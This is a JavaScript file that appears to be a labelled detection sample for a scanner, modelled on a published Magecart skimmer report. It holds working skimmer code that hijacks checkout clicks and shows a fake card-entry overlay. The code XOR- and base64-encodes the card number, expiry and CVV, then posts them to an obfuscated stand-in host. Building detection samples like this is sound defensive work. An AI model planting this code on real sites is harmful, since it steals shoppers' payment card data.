// expect: skimmer-field-harvest
// Modeled on Sansec, "SVG onload tag hides Magecart skimmer" (2026), decoded payload: a fake "Secure
// Checkout" overlay, XOR-with-"script" + btoa, POSTed with no-cors to a double-base64-encoded URL.
document.addEventListener('click', function (e) {
  var a = e.target.closest('a,button,[role="button"]');
  if (!a || !(a.getAttribute('data-role') === 'proceed-to-checkout' || a.id === 'top-cart-btn-checkout')) return;
  e.preventDefault(); e.stopImmediatePropagation();
  var m = document.createElement('div');
  m.innerHTML = '<h2>Secure Checkout</h2><input id="sc-card-number"><input id="sc-exp"><input id="sc-cvv"><button id="sc-pay">Pay</button>';
  document.body.appendChild(m);
  document.getElementById('sc-pay').onclick = function () {
    var payload = { n: document.getElementById('sc-card-number').value, e: document.getElementById('sc-exp').value, c: document.getElementById('sc-cvv').value, site: 'rand0m' };
    var raw = JSON.stringify(payload), enc = '';
    for (var i = 0; i < raw.length; i++) enc += String.fromCharCode(raw.charCodeAt(i) ^ 'script'.charCodeAt(i % 6));
    fetch(atob(atob('YUhSMGNITTZMeTl0WlhSeWFXTnpMbVY0WVcxd2JHVXZabUpmYldWMGNtbGpjeTV3YUhBPQ==')), { method: 'POST', mode: 'no-cors', body: btoa(enc) });
    localStorage.setItem('_mgx_cv', '1');
  };
}, true);
